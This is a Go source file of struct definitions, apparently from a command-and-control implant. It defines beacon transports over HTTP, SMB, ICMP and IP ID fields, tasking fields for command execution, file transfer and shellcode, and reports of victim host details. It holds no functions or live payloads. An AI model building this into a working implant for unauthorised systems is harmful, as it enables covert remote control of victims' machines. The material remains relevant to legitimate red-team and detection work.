package main

type BeaconHttp struct {
	method string
	data []byte
	proxyClients []Beacon
}

type BeaconSmbClient struct {
	beacon Beacon
}

type BeaconSmbServer struct {
	data []byte 
	msgBuffer []string
	initialized bool
}

type BeaconIPID struct {
	data []byte
	proxyClients []Beacon
}

type BeaconICMP struct {
	data []byte
	proxyClients []Beacon
}

type CommandResponse struct {
	Exec []string `json:"exec"`
	Download []string `json:"download"`
	Upload []string `json:"upload"`
	Shellcode []string `json:"shellcode"`
	ProxyClients []string `json:"proxyclients"`
}

type BeaconMessage struct {
	Data []byte `json:"Data"`
	Route []byte `json:"Route"`
}

type CommandUpdate struct {
	Ip string
	Id string
	User string
	Platform string
	Arch string
	Pid string
	Pname string
	Type string
	Data []byte
}
